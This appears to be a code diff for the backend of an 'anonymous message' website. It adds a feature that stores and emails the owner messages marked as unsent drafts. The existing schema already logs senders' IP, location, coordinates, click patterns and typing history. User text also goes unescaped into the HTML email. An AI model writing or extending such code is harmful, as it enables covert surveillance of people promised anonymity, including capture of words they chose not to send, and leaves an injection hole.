@@ -47,6 +47,7 @@ const messageSchema = new mongoose.Schema({
   id: { type: Number, required: true },
   message: { type: String, required: true },
   timestamp: { type: String, required: true },
+  state: { type: String, enum: ['sent', 'unsent'], default: 'sent' },
   timeOnPage: Number,
   clickPatterns: [{ element: String, timestamp: Number }],
   textHistory: [{ text: String, timestamp: Number }],
@@ -84,21 +85,22 @@ const resend = process.env.RESEND_API_KEY
   ? new Resend(process.env.RESEND_API_KEY)
   : null;
 
-async function sendEmail(subject, text, html) {
+async function sendEmail(subject, text, html, state = 'sent') {
   if (!resend) {
     console.log('Email disabled: RESEND_API_KEY not set');
     return;
   }
 
   try {
+    const stateLabel = state === 'unsent' ? '(DRAFT)' : '';
     await resend.emails.send({
       from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
       to: process.env.TO_EMAIL || 'isumuthsara2003@gmail.com',
-      subject,
+      subject: `${stateLabel} ${subject}`,
       text,
       html
     });
-    console.log('Email notification sent');
+    console.log(`Email notification sent (State: ${state})`);
   } catch (err) {
     console.error('Email send failed:', err.message);
   }
@@ -194,6 +196,7 @@ app.post('/message', async (req, res) => {
       id: Date.now(),
       message: message.trim(),
       timestamp: new Date().toISOString(),
+      state: req.body.state || 'sent',
       ip,
       location,
       coordinates: clientCoordinates || coordinates,
@@ -228,6 +231,7 @@ app.post('/message', async (req, res) => {
       : null;
 
     const textBody = `
+Message State: ${newMessage.state === 'sent' ? 'SENT' : 'UNSENT (DRAFT)'}
 Message: ${newMessage.message}
 Time (Sri Lanka - UTC +5:30): ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}
 Time on Page: ${newMessage.timeOnPage ?? 'N/A'} seconds
@@ -250,6 +254,7 @@ User Previous Messages: ${previousMessages.length > 0 ? previousMessages.map(m =
     `.trim();
     const htmlBody = `
       <div style="font-family: Arial, sans-serif; line-height: 1.5;">
+        <p style="background-color: ${newMessage.state === 'sent' ? '#d4edda' : '#fff3cd'}; padding: 10px; border-radius: 5px; border-left: 4px solid ${newMessage.state === 'sent' ? '#28a745' : '#ffc107'};"><strong>Message State:</strong> <span style="font-size: 18px;">${newMessage.state === 'sent' ? '✅ SENT' : '📝 UNSENT (DRAFT)'}</span></p>
         <p><strong>Message:</strong> ${newMessage.message}</p>
         <p><strong>Time (Sri Lanka - UTC +5:30):</strong> ${new Date(new Date(newMessage.timestamp).getTime() + (5.5 * 60 * 60 * 1000)).toISOString().replace('T', ' ').slice(0, 19)}</p>
         <p><strong>Time on Page:</strong> ${newMessage.timeOnPage ?? 'N/A'} seconds</p>
@@ -273,7 +278,7 @@ User Previous Messages: ${previousMessages.length > 0 ? previousMessages.map(m =
       </div>
     `;
 
-    sendEmail('📩 New Anonymous Message', textBody, htmlBody);
+    sendEmail('📩 New Anonymous Message', textBody, htmlBody, newMessage.state);
 
     res.status(201).json({
       message: newMessage,
